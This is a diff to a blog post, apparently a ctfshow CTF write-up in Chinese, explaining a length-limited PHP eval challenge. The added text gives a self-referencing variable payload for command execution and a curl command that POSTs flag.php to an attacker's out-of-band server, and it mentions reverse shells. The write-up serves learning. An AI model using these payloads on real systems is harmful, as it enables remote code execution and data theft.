@@ -1310,7 +1310,21 @@
 <ul>
 <li>这是 PHP 的错误抑制运算符。使用 <code>@</code> 运算符可以抑制表达式中可能出现的任何错误或警告。</li>
 </ul>
-<p>这道题限制了参数的字符串长度</p>
+<p>这道题限制了参数的字符串长度，还对参数进行了一些函数的过滤</p>
+<p>这里可以注意到eval函数里面有一个substr函数，说明会截取这个$F参数的前六位作为php代码去执行，但是因为这里限制了很多函数，且还有长度限制，这时候我们有一个新思路，就是通过传递参数本身实现变量覆盖</p>
+<h3 id="传递参数本身实现变量覆盖"><a href="#传递参数本身实现变量覆盖" class="headerlink" title="传递参数本身实现变量覆盖"></a>传递参数本身实现变量覆盖</h3><p>解题:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">先尝试：</span><br><span class="line">/?F=`$F `;sleep 3	//注意$F后有空格，这样到分号刚好6个字符</span><br><span class="line">这样传入的话可以得到eval(`$F `;)，而$F=`$F `;sleep 3</span><br><span class="line">``反引号是shell_exec()函数的缩写，以命令行形式执行命令</span><br><span class="line">这样会执行命令`$F `;也即shell_exec($F)==&gt;shell_exec(`$F `;sleep 3)</span><br><span class="line">我们就可以成功执行sleep 3了，因为是在shell里执行了，所以前面的表达式不管了，我们通过分号后的表达式来执行想要的命令</span><br><span class="line">所以这是无回显的RCE题目</span><br><span class="line">无回显我们可以用反弹shell 或者curl外带 或者盲注</span><br><span class="line">这里的话反弹没有成功，但是可以外带。</span><br></pre></td></tr></table></figure>
+
+<p>所以这里就是实现了变量覆盖进行命令执行</p>
+<p>然后我们讲一下用curl外带的方法</p>
+<h3 id="curl-外带"><a href="#curl-外带" class="headerlink" title="curl 外带"></a>curl 外带</h3><p>“curl” 命令是一个在命令行下使用的工具，用于传输数据</p>
+<p>curl的相关命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-F参数用来向服务器传输二进制文件，-X参数用来指定http代理</span><br></pre></td></tr></table></figure>
+
+<p>我们需要通过curl让目标服务器向我们的服务器发送我们想要的东西，这里的服务器我们可以用burp的服务器Collaborator服务器</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`;+curl -X POST -F xx=@flag.php  服务器地址</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>ctfshow</category>
